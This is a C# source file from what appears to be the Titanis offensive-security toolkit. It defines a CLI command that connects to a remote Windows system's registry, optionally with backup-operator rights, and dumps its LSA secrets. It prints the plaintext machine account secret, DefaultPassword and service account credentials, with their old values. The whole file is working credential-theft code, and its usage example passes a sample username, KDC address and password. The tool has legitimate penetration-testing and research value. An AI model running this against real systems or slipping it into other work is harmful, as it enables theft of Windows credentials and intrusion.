using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Titanis.Cli;
using Titanis.Winterop.Lsa;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Sam;
using Titanis.Winterop.SamServer;
using Titanis.Winterop.Security;

namespace Titanis.Msrpc.Msrrp.Cli
{
	public class LsaSecretInfo
	{

	}

	[Command]
	[Description("Dumps the LSA secrets of a remote system")]
	[OutputRecordType(typeof(LsaSecret))]
	[Example("Dump the LSA secrets using a backup operator", "{0} -UserName marks@LUMON -Kdc 10.66.0.11 -Password She's@live!! LUMON-FS1 -BackupSemantics", Tag = "marks_backup")]
	public class DumpLsaSecretsCommand : RegistryCommand
	{
		protected override async Task<int> RunAsync(RemoteRegistryClient client, CancellationToken cancellationToken)
		{
			var options = this.BackupSemantics.IsSet ? RegistryKeyOptions.BackupRestore : RegistryKeyOptions.None;

			var lsaStore = await LsaStore.Open(client, options, this.Log, cancellationToken);

			var secrets = await lsaStore.GetSecrets(cancellationToken);
			foreach (var secret in secrets)
			{
				if (
					!secret.CurrentValue.IsNullOrEmpty() && (
						secret.Name.ToUpper() is "$MACHINE.ACC" or "DEFAULTPASSWORD"
						|| secret.Name.StartsWith("_SC_")
						|| secret.Name.StartsWith("SCM:")
					))
				{
					this.WriteMessage($"{secret.Name}: {Encoding.Unicode.GetString(secret.CurrentValue)} (updated on {secret.CurrentUpdateTime})");
					if (secret.OldValue != null)
					{
						this.WriteMessage($"  old value: {Encoding.Unicode.GetString(secret.OldValue)} (updated on {secret.OldUpdateTime})");
					}
				}
			}

			this.WriteRecords(secrets);

			return 0;
		}
	}
}
